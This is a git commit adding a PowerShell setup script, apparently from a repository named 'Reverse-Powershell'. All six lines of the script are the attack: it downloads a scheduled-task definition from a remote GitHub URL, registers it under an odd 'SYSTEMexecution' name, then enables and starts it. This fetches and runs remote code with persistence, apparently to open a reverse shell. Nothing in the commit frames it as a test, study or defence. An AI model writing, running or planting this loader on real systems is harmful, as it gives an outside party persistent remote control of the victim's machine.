4e5dfbfedabfcbe24d2744dcc083e46bfcd42bdf
RacoonK1ng <nevio09.caputo@icloud.com>
2025-01-18 13:46:19 +0100

    Add files via upload

---
+++ setup.ps1
@@ -0,0 +1,6 @@
+Register-ScheduledTask -Xml (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/RacoonK1ng/Reverse-Powershell/refs/heads/main/Task.xml").Content -TaskName "SYSTEMexecutionWindowsbullshit" -Force
+
+Enable-ScheduledTask -TaskName "SYSTEMexecutionWindowsbullshit"
+
+
+Start-ScheduledTask -TaskName "SYSTEMexecutionWindowsbullshit"
